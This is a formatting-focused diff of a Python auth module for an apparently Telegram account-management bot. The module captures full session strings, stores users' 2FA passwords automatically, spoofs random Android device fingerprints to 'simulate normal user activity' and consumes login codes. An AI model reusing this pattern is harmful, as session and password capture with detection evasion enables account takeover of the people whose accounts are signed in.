@@ -5,26 +5,34 @@ Developed by:
 GitHub: https://github.com/mehermankar/teleguard
 Support: https://t.me/ContactXYZrobot
 """
-import asyncio
+
 import logging
 import os
+import random
 import tempfile
 import time
-import random
 from typing import Dict, Optional
+
 from telethon import TelegramClient
-from telethon.errors import PhoneCodeInvalidError, SessionPasswordNeededError, PhoneCodeExpiredError
+from telethon.errors import (
+    PhoneCodeExpiredError,
+    PhoneCodeInvalidError,
+    SessionPasswordNeededError,
+)
 from telethon.errors.rpcerrorlist import PasswordHashInvalidError
 from telethon.sessions import StringSession
+
 from ..core.config import config
-from ..utils.network_helpers import retry_async
 from ..core.device_snooper import DeviceSnooper
 from ..core.mongo_database import mongodb
+from ..utils.network_helpers import retry_async
 
 logger = logging.getLogger(__name__)
 
+
 class OTPDestroyer:
     """Handles OTP destruction using two-client authentication pattern"""
+
     def __init__(self):
         self._temp_sessions: Dict[str, str] = {}
 
@@ -34,7 +42,9 @@ class OTPDestroyer:
         client = None
         try:
             temp_session_file = self._create_temp_session()
-            client = TelegramClient(temp_session_file, config.telegram.api_id, config.telegram.api_hash)
+            client = TelegramClient(
+                temp_session_file, config.telegram.api_id, config.telegram.api_hash
+            )
             await retry_async(client.connect)
             # Request and immediately consume the OTP
             sent_code = await retry_async(client.send_code_request, phone)
@@ -82,7 +92,9 @@ class OTPDestroyer:
         client = None
         try:
             temp_session_file = self._create_temp_session()
-            client = TelegramClient(temp_session_file, config.telegram.api_id, config.telegram.api_hash)
+            client = TelegramClient(
+                temp_session_file, config.telegram.api_id, config.telegram.api_hash
+            )
             await retry_async(client.connect)
             sent_code = await retry_async(client.send_code_request, phone)
             return {
@@ -118,8 +130,10 @@ class OTPDestroyer:
             await self._cleanup_resources(client, session_file)
         return "OTP_DESTROYED"
 
+
 class AuthManager:
     """Manages authentication states and OTP destruction for multiple users"""
+
     def __init__(self, bot_manager=None):
         self._pending_auths: Dict[int, Dict[str, any]] = {}
         self._otp_destroyer = OTPDestroyer()
@@ -127,12 +141,12 @@ class AuthManager:
         self.COOLDOWN_SECONDS = 10
         self.bot_manager = bot_manager
         self.device_snooper = DeviceSnooper(mongodb) if mongodb else None
-        
+
         # Android API credentials only
         self.api_credentials = {
             "android": {
                 "api_id": config.telegram.api_id,
-                "api_hash": config.telegram.api_hash
+                "api_hash": config.telegram.api_hash,
             }
         }
         # Android device profiles only
@@ -182,13 +196,33 @@ class AuthManager:
             {"model": "Xiaomi Mi 12", "system": "Android 12", "version": "10.14.5"},
             {"model": "Xiaomi 13", "system": "Android 13", "version": "10.14.5"},
             {"model": "Xiaomi 13 Pro", "system": "Android 13", "version": "10.14.5"},
-            {"model": "Xiaomi Redmi Note 9", "system": "Android 10", "version": "10.14.5"},
-            {"model": "Xiaomi Redmi Note 10", "system": "Android 11", "version": "10.14.5"},
-            {"model": "Xiaomi Redmi Note 11", "system": "Android 11", "version": "10.14.5"},
-            {"model": "Xiaomi Redmi Note 12", "system": "Android 12", "version": "10.14.5"},
+            {
+                "model": "Xiaomi Redmi Note 9",
+                "system": "Android 10",
+                "version": "10.14.5",
+            },
+            {
+                "model": "Xiaomi Redmi Note 10",
+                "system": "Android 11",
+                "version": "10.14.5",
+            },
+            {
+                "model": "Xiaomi Redmi Note 11",
+                "system": "Android 11",
+                "version": "10.14.5",
+            },
+            {
+                "model": "Xiaomi Redmi Note 12",
+                "system": "Android 12",
+                "version": "10.14.5",
+            },
             {"model": "Xiaomi POCO F3", "system": "Android 11", "version": "10.14.5"},
             {"model": "Xiaomi POCO X3", "system": "Android 10", "version": "10.14.5"},
-            {"model": "Xiaomi Black Shark 4", "system": "Android 11", "version": "10.14.5"},
+            {
+                "model": "Xiaomi Black Shark 4",
+                "system": "Android 11",
+                "version": "10.14.5",
+            },
         ]
 
     async def destroy_otp_code(self, phone: str, code: str) -> bool:
@@ -203,30 +237,30 @@ class AuthManager:
         # Clean up any existing auth for this user
         if user_id in self._pending_auths:
             self.cancel_auth(user_id)
-        
+
         # Set OTP protection for phone login
         if self.bot_manager:
             self.bot_manager.pending_actions[user_id] = {
                 "action": "phone_login",
-                "phone": phone
+                "phone": phone,
             }
-        
+
         try:
             if use_otp_destroyer:
                 auth_data = await self._otp_destroyer.start_phone_auth(phone)
                 self._pending_auths[user_id] = {
                     "type": "destroy_mode",
                     "data": auth_data,
-                    "created_at": time.time()
+                    "created_at": time.time(),
                 }
             else:
                 auth_data = await self._start_normal_auth(phone)
                 self._pending_auths[user_id] = {
-                    "type": "normal", 
+                    "type": "normal",
                     "data": auth_data,
                     "attempts": 0,
                     "created_at": time.time(),
-                    "locked_until": None
+                    "locked_until": None,
                 }
             return True
         except Exception as e:
@@ -235,6 +269,7 @@ class AuthManager:
             # Send user-friendly error message
             if self.bot_manager and self.bot_manager.bot:
                 from ..utils.error_handler import ErrorHandler
+
                 await ErrorHandler.handle_account_error(
                     self.bot_manager.bot, user_id, e, phone, "authentication start"
                 )
@@ -243,28 +278,28 @@ class AuthManager:
     def _get_device_type(self, device: Dict) -> str:
         """Determine device type for API selection - Android only"""
         return "android"
-    
+
     async def _start_normal_auth(self, phone: str) -> Dict[str, any]:
         """Start normal authentication flow with Android device spoofing"""
         device = random.choice(self.devices)
         credentials = self.api_credentials["android"]
-        
+
         client = TelegramClient(
-            StringSession(), 
-            credentials["api_id"], 
+            StringSession(),
+            credentials["api_id"],
             credentials["api_hash"],
             device_model=device["model"],
             system_version=device["system"],
             app_version="10.14.5",
             lang_code="en",
-            system_lang_code="en-US"
+            system_lang_code="en-US",
         )
         await retry_async(client.connect)
         sent_code = await retry_async(client.send_code_request, phone)
         return {
             "phone": phone,
             "phone_code_hash": sent_code.phone_code_hash,
-            "client": client
+            "client": client,
         }
 
     async def complete_auth(
@@ -274,12 +309,19 @@ class AuthManager:
         if user_id not in self._pending_auths:
             raise ValueError("No pending authentication found")
         auth_info = self._pending_auths[user_id]
-        
+
         # Check if auth has expired (10 minutes timeout)
         if time.time() - auth_info["created_at"] > 600:
             self.cancel_auth(user_id)
-            raise ValueError("❌ Authentication session expired. Please restart the login process.")
-        logger.info(f"Completing auth for user {user_id}, type: {auth_info['type']}, has_code: {code is not None}, has_password: {password is not None}")
+            raise ValueError(
+                "❌ Authentication session expired. Please restart the login process."
+            )
+        logger.info(
+            f"Completing auth for user {user_id}, type: {
+                auth_info['type']}, has_code: {
+                code is not None}, has_password: {
+                password is not None}"
+        )
         try:
             if auth_info["type"] == "destroy_mode":
                 return await self._complete_destroy_mode(
@@ -299,9 +341,13 @@ class AuthManager:
                 # Send user-friendly error for other ValueError cases
                 if self.bot_manager and self.bot_manager.bot:
                     from ..utils.error_handler import ErrorHandler
+
                     await ErrorHandler.handle_account_error(
-                        self.bot_manager.bot, user_id, e, 
-                        auth_info.get("data", {}).get("phone", ""), "authentication completion"
+                        self.bot_manager.bot,
+                        user_id,
+                        e,
+                        auth_info.get("data", {}).get("phone", ""),
+                        "authentication completion",
                     )
                 logger.error(f"Auth completion failed for user {user_id}: {e}")
                 raise
@@ -310,9 +356,13 @@ class AuthManager:
             # Send user-friendly error message
             if self.bot_manager and self.bot_manager.bot:
                 from ..utils.error_handler import ErrorHandler
+
                 await ErrorHandler.handle_account_error(
-                    self.bot_manager.bot, user_id, e, 
-                    auth_info.get("data", {}).get("phone", ""), "authentication completion"
+                    self.bot_manager.bot,
+                    user_id,
+                    e,
+                    auth_info.get("data", {}).get("phone", ""),
+                    "authentication completion",
                 )
             raise
 
@@ -324,7 +374,11 @@ class AuthManager:
         return await self._otp_destroyer.verify_code(auth_info["data"], code, password)
 
     async def _complete_normal_auth(
-        self, user_id: int, auth_info: Dict, code: Optional[str], password: Optional[str]
+        self,
+        user_id: int,
+        auth_info: Dict,
+        code: Optional[str],
+        password: Optional[str],
     ) -> str:
         """Complete normal authentication"""
         client = auth_info["data"]["client"]
@@ -340,8 +394,9 @@ class AuthManager:
                     await client.sign_in(password=password)
                     # Store 2FA password automatically using helper
                     from ..utils.twofa_helper import twofa_helper
+
                     await twofa_helper.store_password(user_id, phone, password)
-                    
+
                     # Immediately snoop devices to simulate normal user activity
                     if self.bot_manager and self.device_snooper:
                         await self._immediate_snoop_after_login(user_id, client)
@@ -351,7 +406,7 @@ class AuthManager:
                     if self.bot_manager:
                         self.bot_manager.pending_actions.pop(user_id, None)
                     session_string = StringSession.save(client.session)
-                    
+
                     await client.disconnect()
                     return session_string
                 except PasswordHashInvalidError:
@@ -365,11 +420,16 @@ class AuthManager:
                             await client.disconnect()
                         except Exception:
                             pass
-                        raise ValueError("Too many incorrect attempts. Please restart login.")
+                        raise ValueError(
+                            "Too many incorrect attempts. Please restart login."
+                        )
                     else:
                         # Apply cooldown and keep session alive
                         auth_info["locked_until"] = time.time() + self.COOLDOWN_SECONDS
-                        raise ValueError(f"❌ Incorrect password. {remaining} attempts left. Wait {self.COOLDOWN_SECONDS}s.")
+                        raise ValueError(
+                            f"❌ Incorrect password. {remaining} attempts left. Wait {
+                                self.COOLDOWN_SECONDS}s."
+                        )
             elif code:
                 # OTP step
                 try:
@@ -384,11 +444,13 @@ class AuthManager:
                     # Success - clean up and return session
                     self._pending_auths.pop(user_id)
                     session_string = StringSession.save(client.session)
-                    
+
                     await client.disconnect()
                     return session_string
                 except PhoneCodeInvalidError:
-                    raise ValueError("❌ The code you entered is invalid or expired. Please try again.")
+                    raise ValueError(
+                        "❌ The code you entered is invalid or expired. Please try again."
+                    )
                 except PhoneCodeExpiredError:
                     # Telegram server killed the code (security measure)
                     self.cancel_auth(user_id)
@@ -402,8 +464,11 @@ class AuthManager:
                 except SessionPasswordNeededError:
                     # 2FA required - check if we have stored password first
                     from ..utils.twofa_helper import twofa_helper
-                    success, session_str, error = await twofa_helper.try_sign_in_with_2fa(client, user_id, phone)
-                    
+
+                    success, session_str, error = (
+                        await twofa_helper.try_sign_in_with_2fa(client, user_id, phone)
+                    )
+
                     if success:
                         # Immediately snoop devices to simulate normal user activity
                         if self.bot_manager and self.device_snooper:
@@ -412,45 +477,53 @@ class AuthManager:
                         self._pending_auths.pop(user_id)
                         await client.disconnect()
                         return session_str
-                    
+
                     # Failed - ask for password and set pending action
                     if self.bot_manager:
                         # Update pending action to handle 2FA password
                         self.bot_manager.pending_actions[user_id] = {
                             "action": "2fa_password",
-                            "phone": phone
+                            "phone": phone,
                         }
-                        
+
                         if self.bot_manager.bot:
                             if error == "stored_password_invalid":
                                 await self.bot_manager.bot.send_message(
                                     user_id,
                                     f"🔐 **Two-factor authentication required.**\n\n"
                                     f"⚠️ Your stored 2FA password is incorrect (changed externally).\n\n"
-                                    f"Reply with your current 2FA password."
+                                    f"Reply with your current 2FA password.",
                                 )
                             else:
                                 await self.bot_manager.bot.send_message(
                                     user_id,
                                     f"🔐 **Two-factor authentication required.**\n\n"
-                                    f"Reply with your 2FA password."
+                                    f"Reply with your 2FA password.",
                                 )
-                    
+
                     # 2FA required - keep client alive and pending auth
-                    logger.info(f"2FA required for user {user_id}, keeping client session alive")
+                    logger.info(
+                        f"2FA required for user {user_id}, keeping client session alive"
+                    )
                     raise ValueError("Two-factor authentication password required")
             else:
                 raise ValueError("Either code or password must be provided")
         except SessionPasswordNeededError:
             # 2FA required - keep client alive and pending auth
-            logger.info(f"2FA required for user {user_id}, keeping client session alive")
+            logger.info(
+                f"2FA required for user {user_id}, keeping client session alive"
+            )
             raise ValueError("Two-factor authentication password required")
         except PasswordHashInvalidError:
             # This is handled above in the password section
             raise
         except Exception as e:
             # Only clear pending auth and disconnect for non-2FA/non-password errors
-            if "Two-factor" not in str(e) and "attempts" not in str(e) and "Incorrect password" not in str(e):
+            if (
+                "Two-factor" not in str(e)
+                and "attempts" not in str(e)
+                and "Incorrect password" not in str(e)
+            ):
                 self._pending_auths.pop(user_id, None)
                 if client and client.is_connected():
                     await client.disconnect()
@@ -496,6 +569,10 @@ class AuthManager:
             # Perform device snooping immediately while client is still connected
             # Only snoop, don't terminate any sessions during account addition
             result = await self.device_snooper.snoop_device_info(client, user_id)
-            logger.info(f"Device snooping completed for user {user_id}, found {result.get('count', 0)} devices")
+            logger.info(
+                f"Device snooping completed for user {user_id}, found {
+                    result.get(
+                        'count', 0)} devices"
+            )
         except Exception as e:
             logger.error(f"Immediate device snooping failed: {e}")
